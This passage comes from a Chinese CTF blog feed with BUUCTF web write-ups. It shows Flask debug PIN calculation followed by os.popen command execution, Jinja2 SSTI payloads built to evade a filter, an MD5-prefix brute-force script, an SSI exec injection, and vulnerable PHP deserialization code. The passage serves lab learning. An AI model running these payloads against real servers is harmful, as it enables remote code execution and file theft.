class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>得到288-246-349，在报错的处的末端输入即可拿到flag<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[console ready]</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.popen(<span class="string">&#x27;ls /&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line"><span class="string">&#x27;app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\nthis_is_the_flag.txt\ntmp\nusr\nvar\n&#x27;</span>  </span><br><span class="line">&gt;&gt;&gt; os.popen(<span class="string">&#x27;cat /*flag.txt&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line"><span class="string">&#x27;flag&#123;5cbc02c5-3778-40eb-a102-46edc979f6f0&#125;\n&#x27;</span></span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3>读取目录<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">得到的是HTML实体编码，再用浏览器解析即可</span><br><span class="line"><span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;boot&#x27;</span>, <span class="string">&#x27;dev&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>, <span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;lib&#x27;</span>, <span class="string">&#x27;lib64&#x27;</span>, <span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;mnt&#x27;</span>, <span class="string">&#x27;opt&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;sbin&#x27;</span>, <span class="string">&#x27;srv&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;tmp&#x27;</span>, <span class="string">&#x27;usr&#x27;</span>, <span class="string">&#x27;var&#x27;</span>, <span class="string">&#x27;this_is_the_flag.txt&#x27;</span>,</span><br></pre></td></tr></table></figure>由于过滤了flag，采用拼接的方法<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">分割</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">或者反转</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-<span class="number">1</span>],<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">最后的到flag</span><br><span class="line"></span><br><span class="line">flag&#123;5cbc02c5-<span class="number">3778</span>-40eb-a102-46edc979f6f0&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a href="https://blog.csdn.net/SopRomeo/article/details/105875248">https://blog.csdn.net/SopRomeo/article/details/105875248</a><br><a href="https://blog.csdn.net/weixin_43610673/article/details/104726642">https://blog.csdn.net/weixin_43610673/article/details/104726642</a><br><a href="https://zhuanlan.zhihu.com/p/32336971">Flask debug 模式 PIN 码生成机制安全性研究笔记</a><br><a href="https://zhuanlan.zhihu.com/p/32138231">Flask开启debug模式等于给黑客留了后门</a><br><a href="https://blog.csdn.net/weixin_54648419/article/details/123632203">Flask debug模式算pin码</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[BJDCTF2020]EasySearch-SSI注入</title>
      <link href="/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/04/25/BUUCTF-WEB-BJDCTF2020-EasySearch-SSI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="利用点ssi注入"><a href="#利用点ssi注入" class="headerlink" title="利用点ssi注入"></a>利用点ssi注入</h2><ol><li><p>文件泄露<br>dirsearch</p></li><li><p>ssi注入<br><a href="https://www.secpulse.com/archives/66934.html">服务器端包含注入SSI分析总结</a></p><p>类似于模板注入</p></li></ol><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;<span class="comment">//$admin 为固定值</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;<span class="comment">//读取hash的前6位，可以用爆破</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>爆破password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000000</span>):</span><br><span class="line">    a = hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> a[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i,a) </span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line"><span class="number">2020666</span></span><br><span class="line">6d0bc1153791aa2b4e18b4f344f26ab4</span><br><span class="line"><span class="number">2305004</span></span><br><span class="line">6d0bc1ec71a9b814677b85e3ac9c3d40</span><br></pre></td></tr></table></figure><h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">post</span><br><span class="line">username=admin&amp;password=<span class="number">2020666</span></span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">Url_is_here: public/1505316955027d7b44433dfc413aeeda5bf434ef.shtm</span><br><span class="line"></span><br><span class="line">再放问Url_is_here</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line"></span><br><span class="line">Hello,admin<span class="comment">#所以直接在username处插入shell</span></span><br><span class="line"></span><br><span class="line">data: Monday, <span class="number">25</span>-Apr-<span class="number">2022</span> 09:<span class="number">31</span>:<span class="number">19</span> UTC</span><br><span class="line"></span><br><span class="line">Client IP: <span class="number">10.244</span><span class="number">.80</span><span class="number">.46</span><span class="comment">#这里可能也可以，可以用X-Forwarded-For试一下</span></span><br></pre></td></tr></table></figure><p>因为flag不在根目录，所以查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--<span class="comment">#exec cmd=&quot;find / -name flag*&quot;--&gt;&amp;password=2020666</span></span><br></pre></td></tr></table></figure><p>得到flag，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/flag_990c66bf85a09c664f0b6741840499b2</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.secpulse.com/archives/66934.html">服务器端包含注入SSI分析总结</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[0CTF 2016]piapiapia-数组绕过preg_match\反序列化字符串逃逸</title>
      <link href="/2022/04/25/BUUCTF-WEB-0CTF-2016-piapiapia-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87preg-match-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
      <url>/2022/04/25/BUUCTF-WEB-0CTF-2016-piapiapia-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87preg-match-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li><p>使用数组绕过preg_match</p><p>preg_match只能接受字符串参数，否则会返回false</p></li><li><p>反序列化字符串逃逸，读取目标文件</p><p>参考之前的文章</p></li></ol><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>注册，登录，更新个人信息（漏洞点）</p><h2 id="获取源代码"><a href="#获取源代码" class="headerlink" title="获取源代码"></a>获取源代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u url_str -t 1 -s 0.05 -e php</span><br></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;<span class="comment">//所以要读物config.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);<span class="comment">//可以使用数组绕过</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));<span class="comment">//可能序列化漏洞</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));<span class="comment">//这里就思考可否利用反序列漏洞来读取目标文件config.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight 